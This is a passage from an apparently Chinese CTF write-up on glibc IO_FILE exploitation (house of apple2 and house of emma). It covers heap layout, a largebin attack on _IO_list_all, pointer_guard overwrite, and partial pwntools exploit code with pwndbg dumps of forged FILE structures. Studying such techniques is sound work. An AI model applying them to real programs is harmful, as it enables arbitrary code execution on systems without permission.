<span class="mh">0xb0</span><span class="o">:</span><span class="err">'</span><span class="n">_freeres_buf</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0xb8</span><span class="o">:</span><span class="err">'</span><span class="n">__pad5</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0xc0</span><span class="o">:</span><span class="err">'</span><span class="n">_mode</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0xc4</span><span class="o">:</span><span class="err">'</span><span class="n">_unused2</span><span class="err">'</span><span class="p">,</span>
<span class="mh">0xd8</span><span class="o">:</span><span class="err">'</span><span class="n">vtable</span><span class="err">'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>首先上_IO_list_all的函数</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251009171646347.png" alt="image-20251009171646347" /></p>

<p><code class="language-plaintext highlighter-rouge">0x7ca9cdff3660</code> 是全局变量 <code class="language-plaintext highlighter-rouge">__GI__IO_list_all</code> 的地址（也就是存指针的地方）</p>

<p><code class="language-plaintext highlighter-rouge">0x7ca9cdff3680</code> 是实际的 <code class="language-plaintext highlighter-rouge">FILE</code> 对象（<code class="language-plaintext highlighter-rouge">_IO_2_1_stderr_</code>）所在地址</p>

<p>原结构体：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">struct</span> <span class="n">_IO_FILE_plus</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x7ca9cdff3680</span>
<span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="p">{</span>
  <span class="nb">file</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">_flags</span> <span class="o">=</span> <span class="o">-</span><span class="mi">72540025</span><span class="p">,</span>
    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3703</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3703</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3703</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3703</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3703</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3703</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3703</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">131</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3704</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stderr_</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_markers</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_chain</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3760</span> <span class="o">&lt;</span><span class="n">_IO_2_1_stdout_</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">_fileno</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>
    <span class="n">_flags2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_old_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">_cur_column</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_vtable_offset</span> <span class="o">=</span> <span class="mi">0</span> <span class="sh">'</span><span class="se">\000</span><span class="sh">'</span><span class="p">,</span>
    <span class="n">_shortbuf</span> <span class="o">=</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_lock</span> <span class="o">=</span> <span class="mh">0x7ca9cdff5720</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_2_lock</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">_codecvt</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_wide_data</span> <span class="o">=</span> <span class="mh">0x7ca9cdff2880</span> <span class="o">&lt;</span><span class="n">_IO_wide_data_2</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">_freeres_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_freeres_buf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">__pad5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_unused2</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\000</span><span class="sh">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
  <span class="p">},</span>
  <span class="n">vtable</span> <span class="o">=</span> <span class="mh">0x7ca9cdff4560</span> <span class="o">&lt;</span><span class="n">__GI__IO_file_jumps</span><span class="o">&gt;</span>
<span class="p">}</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<p>修改后：</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20251009173545948.png" alt="image-20251009173545948" /></p>

<p>fake_IO_FILE_plus（house of apple2）:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="n">struct</span> <span class="n">_IO_FILE_plus</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x599c8d7a9810</span>
<span class="err">$</span><span class="mi">20</span> <span class="o">=</span> <span class="p">{</span>
  <span class="nb">file</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">_flags</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1921343488</span><span class="p">,</span>
    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0xa81</span> <span class="o">&lt;</span><span class="n">error</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0xa81</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3250</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">1520</span><span class="o">&gt;</span> <span class="sh">"</span><span class="s">@2</span><span class="se">\377</span><span class="s">ͩ|</span><span class="sh">"</span><span class="p">,</span>
    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x599c8d7a97e0</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x599c8d7a97e0</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x7ca9cdff3640</span> <span class="o">&lt;</span><span class="n">_nl_global_locale</span><span class="o">+</span><span class="mi">224</span><span class="o">&gt;</span> <span class="sh">"</span><span class="se">\255</span><span class="s">a</span><span class="se">\373</span><span class="s">ͩ|</span><span class="sh">"</span><span class="p">,</span>
    <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x599c8d7a9a00</span> <span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">,</span>
    <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_markers</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_chain</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_fileno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_flags2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_old_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">_cur_column</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_vtable_offset</span> <span class="o">=</span> <span class="mi">0</span> <span class="sh">'</span><span class="se">\000</span><span class="sh">'</span><span class="p">,</span>
    <span class="n">_shortbuf</span> <span class="o">=</span> <span class="sh">""</span><span class="p">,</span>
    <span class="n">_lock</span> <span class="o">=</span> <span class="mh">0x7ca9cdff5720</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_2_lock</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">_codecvt</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_wide_data</span> <span class="o">=</span> <span class="mh">0x599c8d7a98f0</span><span class="p">,</span>
    <span class="n">_freeres_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_freeres_buf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">__pad5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_unused2</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\000</span><span class="sh">'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">19</span> <span class="n">times</span><span class="o">&gt;</span>
  <span class="p">},</span>
  <span class="n">vtable</span> <span class="o">=</span> <span class="mh">0x7ca9cdff4020</span> <span class="o">&lt;</span><span class="n">__GI__IO_wfile_jumps</span><span class="o">&gt;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="house-of-emma">house of emma</h4>

<p>这里主要利用了在fflush(stderr)，这个函数会稳定的调用_IO_file_jumps中的sync，如果我们把这个指针伪造成之前提到的pcop的gadget也就是</p>

<pre><code class="language-asm">mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
</code></pre>

<p>我们就可以实现rdx，而且call对应的函数，这里一般为setcontext+61,但是这篇文章是将其call mprotect函数，这样就可以增加可执行权限，之后直接执行orw的shellcode就可以了，原理一样的</p>

<p>程序主逻辑，具备增删改查功能，最小申请堆的大小为key*0x110，限定创建堆块的大小都是large bin中的</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927131001692.png" alt="image-20250927131001692" /></p>

<h5 id="add函数">add函数</h5>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927124257205.png" alt="image-20250927124257205" /></p>

<p>没有堆溢出，有申请三种方式，申请空间有key,key+0x10,2*key三种</p>

<h5 id="delete函数">delete函数</h5>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927124444733.png" alt="image-20250927124444733" /></p>

<p>存在UAF漏洞</p>

<h5 id="edit函数">edit函数</h5>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927125050995.png" alt="image-20250927125050995" /></p>

<p>只有一次写入机会</p>

<h5 id="show函数">show函数</h5>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927130802749.png" alt="image-20250927130802749" /></p>

<p>只有一次泄露的机会</p>

<h3 id="利用步骤"><strong>利用步骤</strong></h3>

<p><strong>1.利用一次write泄露出libc和heapbase</strong></p>

<p><strong>2.构造一次largebin attack，修改_IO_list_all为一个堆地址</strong></p>

<p><strong>3.利用house of apple修改pointer_guard的值为已知地址</strong></p>

<p><strong>4.利用house of emma控制rsp</strong></p>

<p><strong>5.执行orw读取flag</strong></p>

<h4 id="堆风水的构造">堆风水的构造</h4>

<p>由于我们只能任意修改一次的chunk内容，所以如果我们想要进行large bin attack攻击形成任意地址写一个堆地址，又在这个堆地址内完成对于fake file的构造，就需要我们完成以下的chunk构造，借用roderick01师傅的图。只有只有我们才能在伪造bk_nextsize的同时修改size为并且伪造fakechunk实现house of apple和house of emma的攻击。</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/991890_KJZFC3WC96BZZ89.png" alt="991890_KJZFC3WC96BZZ89" /></p>

<p>关于这个堆风水的布局，我之前一直很疑惑，为什么add(small),add(meidum),add(large)有这么多差别？？？</p>

<p>后面学习了很多博主和gpt分析后，我大致理解了原理</p>

<p>我们的目的就是构造三个chunk的布局</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">chunk1</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x24</span>

<span class="n">chunk2</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x34</span>

<span class="n">chunk3</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x54</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>如何构造的呢？</p>

<p>首先我们可以分配的chunk的大小是key,key+0x10,2*key，然后依照大佬方式设置的key为0xa</p>

<p>先设x = key+0x10,y = key +0x10+0x10,z = 2*key+0x10 ,我们可以得到一些关系，</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="mi">2</span> <span class="o">*</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xa</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x34</span>

<span class="mi">2</span> <span class="o">*</span> <span class="n">y</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xa</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x54</span>

<span class="n">z</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="mh">0xa</span> <span class="o">+</span><span class="mh">0x20</span> <span class="o">=</span> <span class="mh">0x24</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>这意味着什么呢？就是我们分配2个small大小的堆，下个堆块指针指向的是chunk2的位置，分配2个meidum大小的堆块，下个堆块指向的是chunk3的位置，分配1个large大小的堆块，下个堆块指向的是chunk1的指针,然后由于后面删除的是unsortbin，导致和没分配一样的，就可以进行堆风水构造</p>

<p>那么合理利用堆风水就可以构造出三个重叠的堆块:</p>

<p>（从上至下顺序为：large+small,2<em>small+small,2</em>medium+small）</p>

<p>继而可以修改堆块A的bk_nextsize指针并伪造一个堆块B，这样再进行largebin attack的时候就既可以任意地址写一个堆地址，也可以控制写的堆地址所在chunk的内容，从而构造fake file结构体。</p>

<h4 id="代码分析">代码分析</h4>

<p>第一次堆风水，布置上面的大佬图中的chunk3（也就是代码里的2），两个meidum+small</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#0
</span><span class="nf">add</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1">#1
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#2
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>第二次堆风水，布置大佬图中的chunk2（也就是代码里的5）,两个small+small</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#3
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#4
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#5
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#6
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>释放堆块3和堆块5进入unsortbin，可以泄露的了libc基址和heap基址</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#3
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#4
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#5
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#6
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="nf">show</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Message: </span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x1f2cc0</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">,</span><span class="n">libc_base</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">heap_base</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">()</span> <span class="o">-</span> <span class="mh">0x17f0</span>
<span class="nf">lg</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">heap_base</span><span class="sh">'</span><span class="p">,</span><span class="n">heap_base</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927150807688.png" alt="image-20250927150807688" /></p>

<h5 id="关于tls段的本地pointer_guard">关于TLS段的本地pointer_guard</h5>

<p>关于TLS段的本地<code class="language-plaintext highlighter-rouge">pointer_guard</code>怎么找，有个很恶心的点，就是在以前系统内核版本不高的时候，你可以用<code class="language-plaintext highlighter-rouge">libc_base</code>去直接得到<code class="language-plaintext highlighter-rouge">pointer_guard</code>的地址的，但是现在反正我无法像roderick01师傅一样，用他们打的时候的<code class="language-plaintext highlighter-rouge">tls</code>段就在<code class="language-plaintext highlighter-rouge">libc基址</code>前面一点，现在不行，已经调试过n遍，一直都会变的，和libc基址没关系了，<code class="language-plaintext highlighter-rouge">pointer_guard</code>的地址，与<code class="language-plaintext highlighter-rouge">ld</code>基地址偏移是固定的，而与<code class="language-plaintext highlighter-rouge">libc</code>基地址的偏移不固定。
<strong>所以在本地调试过程中，需要关闭<code class="language-plaintext highlighter-rouge">aslr</code>，才能获得与<code class="language-plaintext highlighter-rouge">libc</code>基地址的固定偏移，当打远程的题目时，则需要爆破。</strong></p>

<p>方法1：fsbase+0x30（tls+0x30）</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927151958873.png" alt="image-20250927151958873" /></p>

<p>方法2:</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927152213919.png" alt="image-20250927152213919" /></p>

<p>第三次堆风水，布置大佬图中的chunk1（也就是代码里的8）</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#7
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#8
</span><span class="nf">add</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#8
</span><span class="nf">dele</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>解释一下，<code class="language-plaintext highlighter-rouge">dele(8)</code>是为了先free掉我们的提到的chunk2，，当 <code class="language-plaintext highlighter-rouge">malloc</code> 在找合适块时，它会遍历 unsorted 的条目，会优先检查 <code class="language-plaintext highlighter-rouge">unsorted bin</code>。如果某个 unsorted 条目<strong>正好或可以分割</strong>出一个满足请求的小块，<code class="language-plaintext highlighter-rouge">malloc</code> 会用它（并把剩下的部分重新插回合适的 bin）。如果某个条目<strong>太大/不能直接用来划分</strong>，malloc 会把它<strong>按大小插入到 largebin</strong>（或者 smallbin，视大小而定），以便下次快速匹配，然后add(3)这么大的堆块需要0x1550的大小，而前面的unsorted bin只有0xab0大小，所以<code class="language-plaintext highlighter-rouge">malloc</code>会把原来的unsorted bin插入large bin里去，然后从top chunk里分配给新的堆块</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927164516266.png" alt="image-20250927164516266" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nf">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
<span class="nf">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="nf">exit</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>触发largebin attack之后修改成功了，可以修改chunk8的bk_nextsize为<code class="language-plaintext highlighter-rouge">_IO_list_all</code>，，并且chunk2是0x810,于是我们同时将chunk2的size修改，从而伪造一个chunk进行释放，那么想一下，这里触发的largebin attack正好将<code class="language-plaintext highlighter-rouge">_IO_list_all</code>修改为这个伪造的chunk，那么我们继续往下写的话，那相当于就是对伪造的<code class="language-plaintext highlighter-rouge">_IO_list_all</code>进行填充，那我们就实现了任意控制_<code class="language-plaintext highlighter-rouge">_IO_list_all</code>了。</p>

<p><img src="/assets/2025-11-23-IOstudy.assets/image-20250927170229570.png" alt="image-20250927170229570" /></p>

<p>伪造后的file表结构</p>

<p>（这个是修改pointer_guard）</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">p</span> <span class="o">*</span><span class="p">(</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span><span class="o">*</span><span class="p">)</span> <span class="mh">0x555555606810</span>
<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">_flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0xa81</span> <span class="o">&lt;</span><span class="n">error</span><span class="o">:</span> <span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0xa81</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x7ffff7df2cc0</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span> <span class="s">"</span><span class="se">\220\222</span><span class="s">`UUU"</span><span class="p">,</span>
    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x7ffff7df2cc0</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span> <span class="s">"</span><span class="se">\220\222</span><span class="s">`UUU"</span><span class="p">,</span>
    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_write_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_buf_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_buf_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_save_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_backup_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_IO_save_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_markers</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_chain</span> <span class="o">=</span> <span class="mh">0x555555606910</span><span class="p">,</span>
    <span class="n">_fileno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_flags2</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
    <span class="n">_old_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">_cur_column</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">_vtable_offset</span> <span class="o">=</span> <span class="mi">0</span> <span class="sc">'\000'</span><span class="p">,</span>
    <span class="n">_shortbuf</span> <span class="o">=</span> <span class="s">""</span><span class="p">,</span>
    <span class="n">_lock</span> <span class="o">=</span> <span class="mh">0x7ffff7df5720</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_2_lock</span><span class="o">&gt;</span><span class="p">,</span>
    <span class="n">_offset</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">_codecvt</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_wide_data</span> <span class="o">=</span> <span class="mh">0x7ffff7fc4630</span><span class="p">,</span> <span class="c1">//这个是pointer_guard所在的堆地址</span>
    <span class="n">_freeres_list</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">_freeres_buf</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
    <span class="n">__pad5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
